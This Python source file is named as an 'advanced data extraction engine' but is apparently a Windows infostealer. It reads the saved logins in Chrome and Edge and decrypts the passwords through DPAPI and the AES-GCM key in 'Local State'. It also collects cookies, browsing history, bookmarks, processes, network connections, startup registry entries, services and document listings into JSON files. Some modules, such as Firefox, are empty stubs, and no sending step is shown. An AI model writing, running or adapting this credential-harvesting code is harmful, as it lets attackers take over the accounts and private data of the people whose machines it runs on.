"""
Advanced Data Extraction Engine
Handles comprehensive data extraction from various sources with enhanced security and performance.
"""

import os
import json
import sqlite3
import logging
import asyncio
import aiofiles
from typing import Dict, List, Any, Optional, Tuple, Union
from pathlib import Path
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
import psutil
import winreg
from cryptography.fernet import Fernet
import base64
import win32crypt
from Crypto.Cipher import AES

@dataclass
class ExtractionResult:
    """Data class for extraction results."""
    success: bool
    data: Any
    error: Optional[str] = None
    metadata: Optional[Dict[str, Any]] = None

class ExtractionEngine:
    """
    Advanced data extraction engine with multi-threaded processing and enhanced security.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize the extraction engine.
        
        Args:
            config: Configuration dictionary
        """
        self.config = config or self._default_config()
        self.logger = logging.getLogger(__name__)
        self._setup_logging()
        
        # Initialize extraction modules
        self._browser_extractors = {}
        self._system_extractors = {}
        self._file_extractors = {}
        
        self._initialize_extractors()
    
    def _default_config(self) -> Dict[str, Any]:
        """Return default configuration."""
        return {
            'extraction': {
                'max_threads': 8,
                'timeout': 30,
                'chunk_size': 8192,
                'retry_attempts': 3
            },
            'browsers': {
                'chrome': True,
                'edge': True,
                'firefox': False,
                'safari': False
            },
            'system': {
                'processes': True,
                'network': True,
                'registry': True,
                'services': True
            },
            'files': {
                'documents': True,
                'images': False,
                'archives': True,
                'executables': False
            }
        }
    
    def _setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    def _initialize_extractors(self):
        """Initialize all extraction modules."""
        try:
            # Browser extractors
            self._browser_extractors = {
                'chrome': ChromeExtractor(),
                'edge': EdgeExtractor(),
                'firefox': FirefoxExtractor()
            }
            
            # System extractors
            self._system_extractors = {
                'processes': ProcessExtractor(),
                'network': NetworkExtractor(),
                'registry': RegistryExtractor(),
                'services': ServiceExtractor()
            }
            
            # File extractors
            self._file_extractors = {
                'documents': DocumentExtractor(),
                'images': ImageExtractor(),
                'archives': ArchiveExtractor()
            }
            
            self.logger.info("All extractors initialized successfully")
            
        except Exception as e:
            self.logger.error(f"Failed to initialize extractors: {e}")
            raise
    
    async def extract_all_data(self, target_path: str) -> Dict[str, ExtractionResult]:
        """
        Extract all available data using multiple extractors.
        
        Args:
            target_path: Path to save extracted data
            
        Returns:
            Dictionary of extraction results
        """
        try:
            results = {}
            
            # Create target directory
            os.makedirs(target_path, exist_ok=True)
            
            # Extract browser data
            if self.config['browsers']['chrome']:
                results['chrome'] = await self._extract_browser_data('chrome', target_path)
            
            if self.config['browsers']['edge']:
                results['edge'] = await self._extract_browser_data('edge', target_path)
            
            # Extract system data
            if self.config['system']['processes']:
                results['processes'] = await self._extract_system_data('processes', target_path)
            
            if self.config['system']['network']:
                results['network'] = await self._extract_system_data('network', target_path)
            
            # Extract file data
            if self.config['files']['documents']:
                results['documents'] = await self._extract_file_data('documents', target_path)
            
            self.logger.info("All data extraction completed")
            return results
            
        except Exception as e:
            self.logger.error(f"Data extraction failed: {e}")
            raise
    
    async def _extract_browser_data(self, browser: str, target_path: str) -> ExtractionResult:
        """Extract browser-specific data."""
        try:
            extractor = self._browser_extractors.get(browser)
            if not extractor:
                return ExtractionResult(False, None, f"No extractor for browser: {browser}")
            
            data = await extractor.extract_all()
            
            # Save data
            data_path = os.path.join(target_path, f"{browser}_data.json")
            async with aiofiles.open(data_path, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(data, indent=2, default=str))
            
            return ExtractionResult(True, data, metadata={'file_path': data_path})
            
        except Exception as e:
            self.logger.error(f"Browser data extraction failed for {browser}: {e}")
            return ExtractionResult(False, None, str(e))
    
    async def _extract_system_data(self, data_type: str, target_path: str) -> ExtractionResult:
        """Extract system-specific data."""
        try:
            extractor = self._system_extractors.get(data_type)
            if not extractor:
                return ExtractionResult(False, None, f"No extractor for system data: {data_type}")
            
            data = await extractor.extract_all()
            
            # Save data
            data_path = os.path.join(target_path, f"{data_type}_data.json")
            async with aiofiles.open(data_path, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(data, indent=2, default=str))
            
            return ExtractionResult(True, data, metadata={'file_path': data_path})
            
        except Exception as e:
            self.logger.error(f"System data extraction failed for {data_type}: {e}")
            return ExtractionResult(False, None, str(e))
    
    async def _extract_file_data(self, data_type: str, target_path: str) -> ExtractionResult:
        """Extract file-specific data."""
        try:
            extractor = self._file_extractors.get(data_type)
            if not extractor:
                return ExtractionResult(False, None, f"No extractor for file data: {data_type}")
            
            data = await extractor.extract_all()
            
            # Save data
            data_path = os.path.join(target_path, f"{data_type}_data.json")
            async with aiofiles.open(data_path, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(data, indent=2, default=str))
            
            return ExtractionResult(True, data, metadata={'file_path': data_path})
            
        except Exception as e:
            self.logger.error(f"File data extraction failed for {data_type}: {e}")
            return ExtractionResult(False, None, str(e))

class BaseExtractor:
    """Base class for all extractors."""
    
    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract all available data. Must be implemented by subclasses."""
        raise NotImplementedError

class ChromeExtractor(BaseExtractor):
    """Advanced Chrome data extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract all Chrome data."""
        try:
            data = {}
            
            # Extract basic profile data
            data['profiles'] = await self._extract_profiles()
            
            # Extract passwords
            data['passwords'] = await self._extract_passwords()
            
            # Extract history
            data['history'] = await self._extract_history()
            
            # Extract bookmarks
            data['bookmarks'] = await self._extract_bookmarks()
            
            # Extract cookies
            data['cookies'] = await self._extract_cookies()
            
            return data
            
        except Exception as e:
            self.logger.error(f"Chrome extraction failed: {e}")
            return {'error': str(e)}
    
    async def _extract_profiles(self) -> Dict[str, Any]:
        """Extract Chrome profile information."""
        try:
            profiles = {}
            user_data_path = os.path.join(os.environ['USERPROFILE'], 
                                        'AppData', 'Local', 'Google', 'Chrome', 'User Data')
            
            if not os.path.exists(user_data_path):
                return {'error': 'Chrome user data not found'}
            
            # Read Local State
            local_state_path = os.path.join(user_data_path, 'Local State')
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                    profiles['local_state'] = local_state
            
            # Extract profile information
            profiles_path = os.path.join(user_data_path, 'Default')
            if os.path.exists(profiles_path):
                profiles['default_profile'] = await self._extract_profile_info(profiles_path)
            
            return profiles
            
        except Exception as e:
            self.logger.error(f"Profile extraction failed: {e}")
            return {'error': str(e)}
    
    async def _extract_passwords(self) -> List[Dict[str, Any]]:
        """Extract Chrome passwords."""
        try:
            passwords = []
            login_data_path = os.path.join(os.environ['USERPROFILE'], 
                                         'AppData', 'Local', 'Google', 'Chrome', 
                                         'User Data', 'Default', 'Login Data')
            
            if not os.path.exists(login_data_path):
                return []
            
            # Connect to SQLite database
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()
            
            # Query passwords
            cursor.execute("""
                SELECT origin_url, username_value, password_value, 
                       date_created, date_last_used 
                FROM logins 
                ORDER BY date_last_used DESC
            """)
            
            for row in cursor.fetchall():
                password_data = {
                    'url': row[0],
                    'username': row[1],
                    'password': self._decrypt_password(row[2]),
                    'created': row[3],
                    'last_used': row[4]
                }
                passwords.append(password_data)
            
            conn.close()
            return passwords
            
        except Exception as e:
            self.logger.error(f"Password extraction failed: {e}")
            return []
    
    def _decrypt_password(self, encrypted_password: bytes) -> str:
        """Decrypt Chrome password."""
        try:
            if not encrypted_password:
                return ""
            
            # Try DPAPI decryption first
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted.decode('utf-8')
            except:
                pass
            
            # Try AES decryption
            try:
                # Get encryption key from Local State
                local_state_path = os.path.join(os.environ['USERPROFILE'], 
                                               'AppData', 'Local', 'Google', 'Chrome', 
                                               'User Data', 'Local State')
                
                if os.path.exists(local_state_path):
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                        encrypted_key = local_state['os_crypt']['encrypted_key']
                
                # Decrypt the key
                encrypted_key = base64.b64decode(encrypted_key)[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                
                # Decrypt password
                iv = encrypted_password[3:15]
                password = encrypted_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(password)
                return decrypted[:-16].decode('utf-8')
                
            except:
                pass
            
            return "[ENCRYPTED]"
            
        except Exception as e:
            self.logger.error(f"Password decryption failed: {e}")
            return "[DECRYPTION_FAILED]"
    
    async def _extract_history(self) -> List[Dict[str, Any]]:
        """Extract Chrome browsing history."""
        try:
            history = []
            history_path = os.path.join(os.environ['USERPROFILE'], 
                                      'AppData', 'Local', 'Google', 'Chrome', 
                                      'User Data', 'Default', 'History')
            
            if not os.path.exists(history_path):
                return []
            
            conn = sqlite3.connect(history_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                history_item = {
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'last_visit': row[3]
                }
                history.append(history_item)
            
            conn.close()
            return history
            
        except Exception as e:
            self.logger.error(f"History extraction failed: {e}")
            return []
    
    async def _extract_bookmarks(self) -> Dict[str, Any]:
        """Extract Chrome bookmarks."""
        try:
            bookmarks_path = os.path.join(os.environ['USERPROFILE'], 
                                        'AppData', 'Local', 'Google', 'Chrome', 
                                        'User Data', 'Default', 'Bookmarks')
            
            if not os.path.exists(bookmarks_path):
                return {}
            
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                bookmarks = json.load(f)
            
            return bookmarks
            
        except Exception as e:
            self.logger.error(f"Bookmark extraction failed: {e}")
            return {}
    
    async def _extract_cookies(self) -> List[Dict[str, Any]]:
        """Extract Chrome cookies."""
        try:
            cookies = []
            cookies_path = os.path.join(os.environ['USERPROFILE'], 
                                      'AppData', 'Local', 'Google', 'Chrome', 
                                      'User Data', 'Default', 'Cookies')
            
            if not os.path.exists(cookies_path):
                return []
            
            conn = sqlite3.connect(cookies_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT name, value, host_key, path, expires_utc, 
                       is_secure, is_httponly, creation_utc 
                FROM cookies 
                ORDER BY creation_utc DESC 
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                cookie = {
                    'name': row[0],
                    'value': row[1],
                    'domain': row[2],
                    'path': row[3],
                    'expires': row[4],
                    'secure': bool(row[5]),
                    'httponly': bool(row[6]),
                    'created': row[7]
                }
                cookies.append(cookie)
            
            conn.close()
            return cookies
            
        except Exception as e:
            self.logger.error(f"Cookie extraction failed: {e}")
            return []
    
    async def _extract_profile_info(self, profile_path: str) -> Dict[str, Any]:
        """Extract profile information."""
        try:
            profile_info = {}
            
            # Read Preferences
            preferences_path = os.path.join(profile_path, 'Preferences')
            if os.path.exists(preferences_path):
                with open(preferences_path, 'r', encoding='utf-8') as f:
                    preferences = json.load(f)
                    profile_info['preferences'] = preferences
            
            return profile_info
            
        except Exception as e:
            self.logger.error(f"Profile info extraction failed: {e}")
            return {}

class EdgeExtractor(BaseExtractor):
    """Advanced Edge data extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract all Edge data."""
        try:
            data = {}
            
            # Extract profile data
            data['profiles'] = await self._extract_profiles()
            
            # Extract passwords
            data['passwords'] = await self._extract_passwords()
            
            return data
            
        except Exception as e:
            self.logger.error(f"Edge extraction failed: {e}")
            return {'error': str(e)}
    
    async def _extract_profiles(self) -> Dict[str, Any]:
        """Extract Edge profile information."""
        try:
            profiles = {}
            user_data_path = os.path.join(os.environ['USERPROFILE'], 
                                        'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
            
            if not os.path.exists(user_data_path):
                return {'error': 'Edge user data not found'}
            
            # Read Local State
            local_state_path = os.path.join(user_data_path, 'Local State')
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                    profiles['local_state'] = local_state
            
            return profiles
            
        except Exception as e:
            self.logger.error(f"Edge profile extraction failed: {e}")
            return {'error': str(e)}
    
    async def _extract_passwords(self) -> List[Dict[str, Any]]:
        """Extract Edge passwords."""
        try:
            passwords = []
            login_data_path = os.path.join(os.environ['USERPROFILE'], 
                                         'AppData', 'Local', 'Microsoft', 'Edge', 
                                         'User Data', 'Default', 'Login Data')
            
            if not os.path.exists(login_data_path):
                return []
            
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value, 
                       date_created, date_last_used 
                FROM logins 
                ORDER BY date_last_used DESC
            """)
            
            for row in cursor.fetchall():
                password_data = {
                    'url': row[0],
                    'username': row[1],
                    'password': self._decrypt_password(row[2]),
                    'created': row[3],
                    'last_used': row[4]
                }
                passwords.append(password_data)
            
            conn.close()
            return passwords
            
        except Exception as e:
            self.logger.error(f"Edge password extraction failed: {e}")
            return []
    
    def _decrypt_password(self, encrypted_password: bytes) -> str:
        """Decrypt Edge password."""
        try:
            if not encrypted_password:
                return ""
            
            # Try DPAPI decryption
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted.decode('utf-8')
            except:
                return "[ENCRYPTED]"
            
        except Exception as e:
            self.logger.error(f"Edge password decryption failed: {e}")
            return "[DECRYPTION_FAILED]"

class FirefoxExtractor(BaseExtractor):
    """Firefox data extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract all Firefox data."""
        try:
            data = {}
            
            # Firefox uses different storage format
            # Implementation would go here
            
            return data
            
        except Exception as e:
            self.logger.error(f"Firefox extraction failed: {e}")
            return {'error': str(e)}

class ProcessExtractor(BaseExtractor):
    """System process extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract system process information."""
        try:
            processes = []
            
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
                try:
                    process_info = {
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'username': proc.info['username'],
                        'cpu_percent': proc.info['cpu_percent'],
                        'memory_mb': proc.info['memory_info'].rss / 1024 / 1024 if proc.info['memory_info'] else 0
                    }
                    processes.append(process_info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {'processes': processes}
            
        except Exception as e:
            self.logger.error(f"Process extraction failed: {e}")
            return {'error': str(e)}

class NetworkExtractor(BaseExtractor):
    """Network information extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract network information."""
        try:
            network_info = {}
            
            # Get network interfaces
            interfaces = psutil.net_if_addrs()
            network_info['interfaces'] = {}
            
            for interface, addresses in interfaces.items():
                network_info['interfaces'][interface] = []
                for addr in addresses:
                    network_info['interfaces'][interface].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
            
            # Get network connections
            connections = psutil.net_connections()
            network_info['connections'] = []
            
            for conn in connections:
                if conn.status == 'ESTABLISHED':
                    network_info['connections'].append({
                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                        'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                        'status': conn.status,
                        'pid': conn.pid
                    })
            
            return network_info
            
        except Exception as e:
            self.logger.error(f"Network extraction failed: {e}")
            return {'error': str(e)}

class RegistryExtractor(BaseExtractor):
    """Windows registry extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract registry information."""
        try:
            registry_data = {}
            
            # Extract startup programs
            startup_keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
            ]
            
            registry_data['startup_programs'] = []
            
            for key_path in startup_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            registry_data['startup_programs'].append({
                                'name': name,
                                'value': value,
                                'key_path': key_path
                            })
                            i += 1
                        except OSError:
                            break
                    winreg.CloseKey(key)
                except Exception:
                    continue
            
            return registry_data
            
        except Exception as e:
            self.logger.error(f"Registry extraction failed: {e}")
            return {'error': str(e)}

class ServiceExtractor(BaseExtractor):
    """Windows service extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract Windows services information."""
        try:
            services = []
            
            for service in psutil.win_service_iter():
                try:
                    service_info = service.as_dict()
                    services.append({
                        'name': service_info.get('name'),
                        'display_name': service_info.get('display_name'),
                        'status': service_info.get('status'),
                        'start_type': service_info.get('start_type'),
                        'binary_path': service_info.get('binpath')
                    })
                except Exception:
                    continue
            
            return {'services': services}
            
        except Exception as e:
            self.logger.error(f"Service extraction failed: {e}")
            return {'error': str(e)}

class DocumentExtractor(BaseExtractor):
    """Document file extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract document files."""
        try:
            documents = []
            document_extensions = ['.pdf', '.doc', '.docx', '.txt', '.rtf', '.odt']
            
            # Search common document directories
            search_paths = [
                os.path.join(os.environ['USERPROFILE'], 'Documents'),
                os.path.join(os.environ['USERPROFILE'], 'Desktop'),
                os.path.join(os.environ['USERPROFILE'], 'Downloads')
            ]
            
            for search_path in search_paths:
                if os.path.exists(search_path):
                    for root, dirs, files in os.walk(search_path):
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in document_extensions):
                                file_path = os.path.join(root, file)
                                try:
                                    stat = os.stat(file_path)
                                    documents.append({
                                        'name': file,
                                        'path': file_path,
                                        'size': stat.st_size,
                                        'modified': stat.st_mtime,
                                        'created': stat.st_ctime
                                    })
                                except Exception:
                                    continue
            
            return {'documents': documents}
            
        except Exception as e:
            self.logger.error(f"Document extraction failed: {e}")
            return {'error': str(e)}

class ImageExtractor(BaseExtractor):
    """Image file extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract image files."""
        try:
            images = []
            image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp']
            
            # Implementation similar to DocumentExtractor
            # but for image files
            
            return {'images': images}
            
        except Exception as e:
            self.logger.error(f"Image extraction failed: {e}")
            return {'error': str(e)}

class ArchiveExtractor(BaseExtractor):
    """Archive file extractor."""
    
    async def extract_all(self) -> Dict[str, Any]:
        """Extract archive files."""
        try:
            archives = []
            archive_extensions = ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2']
            
            # Implementation similar to DocumentExtractor
            # but for archive files
            
            return {'archives': archives}
            
        except Exception as e:
            self.logger.error(f"Archive extraction failed: {e}")
            return {'error': str(e)}